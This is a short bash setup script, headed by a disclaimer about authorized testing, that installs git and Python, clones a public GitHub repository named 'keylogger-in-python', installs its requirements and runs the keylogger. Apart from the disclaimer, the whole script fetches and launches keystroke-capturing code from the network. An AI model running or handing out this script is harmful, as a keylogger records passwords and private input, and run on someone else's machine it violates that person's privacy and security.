#!/bin/bash
# ==============================================================================
# DISCLAIMER & LEGAL NOTICE:
# This demonstration setup script is provided STRICTLY for authorized security testing,
# awareness demonstration, and educational purposes in authorized environments.
# ==============================================================================
clear

apt install git

clear

git clone https://github.com/R3DHULK/keylogger-in-python

clear

cd keylogger-in-python

clear

apt install python

clear

python -m pip install -r requirements.txt

clear

python py-keylogger.py
